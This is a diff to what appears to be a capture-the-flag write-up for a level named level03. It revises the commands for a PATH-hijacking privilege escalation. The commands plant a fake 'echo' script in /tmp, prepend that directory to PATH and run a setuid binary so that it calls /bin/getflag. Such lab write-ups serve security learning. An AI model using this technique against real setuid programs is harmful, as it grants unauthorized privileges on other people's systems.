@@ -21,7 +21,15 @@ int main(int argc,char **argv,char **envp)
 ./level03 has special permissions (+s) for user flag03
 lets modify $PATH so we can execute a fake version of echo which redirects
 to getflag
-echo "/bin/getflag" > /dev/shm/echo
-export PATH=/dev/shm:$PATH
-chmod +x /dev/shm/echo
+
+```
+exploit=/tmp/echo
+cat << EOF > $exploit
+#!/bin/bash
+/bin/getflag
+EOF
+
+export PATH=/tmp:$PATH
+/bin/chmod +x $exploit
 ./level03
+```
